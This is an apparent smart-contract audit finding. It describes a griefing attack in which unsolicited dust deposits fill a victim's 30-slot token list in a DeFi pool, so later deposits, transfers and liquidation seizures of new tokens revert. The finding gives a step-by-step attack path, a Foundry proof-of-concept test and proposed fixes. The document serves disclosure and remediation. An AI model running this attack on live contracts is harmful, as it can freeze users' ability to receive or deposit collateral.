### Title
Griefing via dust deposits fills a victim's `MAX_TOKENS_PER_USER` slots, DoSing all new-token deposits and transfers to the victim - (File: contracts/DepositToken.sol)

### Summary
Analogous to the FreeSWITCH DTLS ClientHello DoS (an unvalidated inbound message tears down a session), an unprivileged attacker can force unwanted `DepositToken` positions onto a victim's per-account list. Each unsolicited dust `deposit(amount_, onBehalfOf_ = victim)` adds the token to `depositTokensOfAccount[victim]`. Once the combined deposit/debt token count reaches `MAX_TOKENS_PER_USER = 30`, `Pool.addToDepositTokensOfAccount` reverts with `UserReachedMaxTokens`, causing every subsequent deposit or transfer of any *new* deposit token to the victim to revert — a repeatable denial of service against the victim's ability to open or receive new collateral positions.

### Finding Description
- `DepositToken.deposit` accepts an arbitrary `onBehalfOf_` beneficiary and mints the deposit token to them (contracts/DepositToken.sol:211-237).
- `_mint` calls `pool.addToDepositTokensOfAccount(account_)` whenever the recipient's balance was zero (contracts/DepositToken.sol:486-488).
- `Pool.addToDepositTokensOfAccount` enforces `onlyIfAdditionWillNotReachMaxTokens`, which reverts once `debtTokensOfAccount.length + depositTokensOfAccount.length >= 30` (contracts/Pool.sol:143-148, 204-208).
- The same add happens in `_transfer` for first-time recipients (contracts/DepositToken.sol:518-520), so once the list is full, even plain `transfer`/`transferFrom`/`seize` of a token the victim doesn't already hold reverts, since the revert in `addToDepositTokensOfAccount` propagates and undoes the whole transfer.

Attack path (all public, unprivileged):
1. For each enabled deposit token `i` the victim doesn't hold, attacker calls `depositToken_i.deposit(dust_i, victim)` — cost is a few wei of underlying plus gas.
2. After ~30 such deposits (or combined with debt tokens the victim holds), `depositTokensOfAccount[victim]` is full.
3. Any subsequent `deposit(x, victim)`, `transfer(victim, x)`, `transferFrom(.., victim, x)`, or liquidation `seize(.., victim, ..)` of a token not already in the list reverts with `UserReachedMaxTokens`.

### Impact Explanation
Liveness / freezing of funds: the victim is denied the ability to receive or deposit any collateral type not already in their list. For an EOA this is temporary (they can transfer dust out to free slots), but for contract victims without arbitrary-call capability (multisig-like integrations, smart wallet positions, other protocol contracts holding deposit tokens) the slots can never be cleared, making the freeze permanent — no new collateral can ever be deposited to or received by that account. The invariant broken is liveness of deposit/transfer entry points for the griefed account, mirroring the CVE's "deny new sessions" pattern.

### Likelihood Explanation
Fully permissionless: `deposit` is `whenNotPaused nonReentrant` only, `onBehalfOf_` is attacker-chosen, and dust amounts are near-free. No governor, oracle, or privileged role is needed. Cost scales linearly with the number of enabled deposit tokens and must be repeated per pool. Mitigation exists for EOA victims (self-service cleanup via `transfer`), which caps severity at Medium — consistent with the CVE's CVSS 5.9.

### Recommendation
- Only add to `depositTokensOfAccount` on `deposit` where the caller opts in (e.g., require `onBehalfOf_ == _msgSender()` or an explicit opt-in mapping), or skip the list-add and treat unsolicited balances as non-enumerated.
- Alternatively, make `addToDepositTokensOfAccount`/`addToDebtTokensOfAccount` non-reverting when the cap is hit (emit an event and return false) so transfers don't fail, and exclude unlisted tokens from `debtPositionOf` consistently.
- A simpler invariant: only count tokens toward the cap when the position actually contributes collateral in `debtPositionOf` (e.g., balance above a dust threshold).

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {DepositToken} from "../contracts/DepositToken.sol";
import {Pool, UserReachedMaxTokens} from "../contracts/Pool.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract DustListGriefingTest is Test {
    // Deploy Pool + N DepositTokens on a local fork / hardhat fixture,
    // each backed by a distinct ERC20 underlying, all enabled by governor in setUp.

    Pool pool;
    DepositToken[] depositTokens; // >= 31 enabled deposit tokens
    address victim = address(0xBEEF);
    address attacker = address(0xBAD);

    function test_fillVictimTokenList() public {
        uint256 max = pool.MAX_TOKENS_PER_USER(); // 30

        // Attacker dust-deposits `max` distinct deposit tokens to victim
        for (uint256 i; i < max; ++i) {
            DepositToken dt = depositTokens[i];
            IERC20 underlying = dt.underlying();
            deal(address(underlying), attacker, 1);
            vm.startPrank(attacker);
            underlying.approve(address(dt), 1);
            dt.deposit(1, victim); // adds token i to depositTokensOfAccount[victim]
            vm.stopPrank();
        }

        assertEq(pool.getDepositTokensOfAccount(victim).length, max);

        // Now: ANY deposit of a token victim doesn't already hold reverts
        DepositToken newDt = depositTokens[max]; // a 31st enabled deposit token
        IERC20 newUnder = newDt.underlying();
        deal(address(newUnder), victim, 100 ether);
        vm.startPrank(victim);
        newUnder.approve(address(newDt), 100 ether);
        vm.expectRevert(UserReachedMaxTokens.selector);
        newDt.deposit(100 ether, victim);
        vm.stopPrank();

        // Likewise, a transfer of a new token to the victim reverts
        deal(address(newUnder), attacker, 1);
        vm.startPrank(attacker);
        newUnder.approve(address(newDt), 1);
        newDt.deposit(1, attacker); // attacker holds the token himself
        vm.expectRevert(UserReachedMaxTokens.selector);
        newDt.transfer(victim, 1);
        vm.stopPrank();
    }
}
```
This reproduces the denial: after 30 forced dust deposits, `deposit`, `transfer`, `transferFrom`, and `seize` (inside `Pool.liquidate`) of any not-yet-held deposit token to the victim all revert.